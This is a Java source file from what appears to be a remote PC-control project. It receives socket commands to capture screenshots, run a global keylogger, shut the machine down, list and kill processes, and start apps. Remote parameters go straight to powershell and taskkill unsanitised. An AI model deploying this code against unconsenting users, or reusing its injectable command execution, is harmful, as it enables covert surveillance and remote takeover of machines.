package com.mmt.server.Model;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import javafx.scene.control.Alert;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;

public class ServerHandlerModel implements Runnable {
    private static final Alert error = new Alert(Alert.AlertType.ERROR);
    private static ServerHandlerModel model;
    private static Socket socket;
    private static String command;
    private static String param;
    private static DataInputStream input;
    private static DataOutputStream output;
    private static BufferedOutputStream bufferedOutput;
    private static ServerKeyListener listener;

    private ServerHandlerModel() {
    }

    public static void create() {
        if (model == null) {
            // create model and socket
            model = new ServerHandlerModel();
            socket = ServerModel.getClient();

            // create global screen for keylogger
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException e) {
                e.printStackTrace();
            }

            // create input and output stream
            try {
                input = new DataInputStream(socket.getInputStream());
                output = new DataOutputStream(socket.getOutputStream());
                bufferedOutput = new BufferedOutputStream(socket.getOutputStream());
            } catch (IOException e) {
                e.printStackTrace();
            }

            // create error alert
            error.setTitle("Có lỗi xảy ra");
        }
    }

    public static ServerHandlerModel getModel() {
        return model;
    }

    public static void handleCommand(String command, String param) throws Exception {
        switch (command) {
            case ("Shut Down") -> {
                shutDown(Integer.parseInt(param));
            }

            case ("Screen Shot") -> {
                BufferedImage img = screenShot();
                ImageIO.write(img, "PNG", bufferedOutput);
                bufferedOutput.flush();
            }

            case ("Key Listener") -> {
                listener = new ServerKeyListener();
                GlobalScreen.addNativeKeyListener(listener);
            }

            case ("Stop Key Listener") -> {
                GlobalScreen.removeNativeKeyListener(listener);
            }

            case ("Close") -> {
                ServerModel.isConnected = false;
                socket.close();
                ServerModel.getServer().close();
                System.exit(0);
            }

            case ("Show Process") -> {
                listRunProcess();
            }

            case ("Show Running App") -> {
                listRunApp();
            }

            case ("Show All App") -> {
                listAllApp();
            }

            case ("End Process") -> {
                stopProcess(param);
            }

            case ("Close App") -> {
                stopApp(param);
            }

            case ("Open App") -> {
                startApp(param);
            }

            default -> {
            }
        }
    }

    private static BufferedImage screenShot() throws Exception {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        Robot robot = new Robot();
        return robot.createScreenCapture(screenRect);
    }

    private static void shutDown(int timer) throws Exception {
        ProcessBuilder builder = new ProcessBuilder("powershell",
                "-command",
                "shutdown",
                "-s",
                "-t",
                String.valueOf(timer));
        builder.start();

        System.exit(0);
    }

    private static void listRunProcess() throws Exception {
        Process p = new ProcessBuilder("powershell.exe",
                "\"gps | select Id, ProcessName | ConvertTo-CSV").start();
        sendProcess(p);
        p.waitFor();
        System.out.println("Done");
    }

    private static void listAllApp() throws Exception {
        Process p = new ProcessBuilder("powershell",
                "\"get-startapps | ? {$_.appid -match {\\.exe}} | ConvertTo-CSV").start();
        sendProcess(p);
        p.waitFor();
        System.out.println("Done");
    }

    private static void listRunApp() throws Exception {
        Process p = new ProcessBuilder("powershell",
                "\"gps| ? {$_.MainWindowTitle} | select Id, ProcessName, MainWindowTitle | ConvertTo-CSV").start();
        sendProcess(p);
        p.waitFor();
        System.out.println("Done");
    }

    private static void stopProcess(String param) throws Exception {
        Process p = new ProcessBuilder("powershell.exe",
                "taskkill /IM " + param + ".exe" + " /F").start();
        p.waitFor();
        System.out.println("Done");
    }

    private static void stopApp(String param) throws Exception {
        Process p = new ProcessBuilder("powershell.exe",
                "taskkill /IM " + param + " /F").start();
        p.waitFor();
        System.out.println("Done");
    }

    private static void startApp(String param) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"powershell", param});
            p.waitFor();
            System.out.println("Done");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendProcess(Process p) {
        new Thread(() -> {
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = null;
            try {
                while ((line = br.readLine()) != null) {
                    output.writeUTF(line);
                }
                output.writeUTF("stop");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }).start();
    }

    public static DataOutputStream getOutput() {
        return output;
    }

    @Override
    public void run() {
        while (ServerModel.isConnect()) {
            // try to read input stream
            try {
                command = input.readUTF();
                System.out.println(command);
                param = input.readUTF();
                System.out.println(param);
            } catch (IOException e) {
                ServerModel.isConnected = false;
                // try to close socket
                try {
                    socket.close();
                    ServerModel.getServer().close();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
                // exit program
                System.exit(0);
            }

            // try to do command
            try {
                handleCommand(command, param);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

}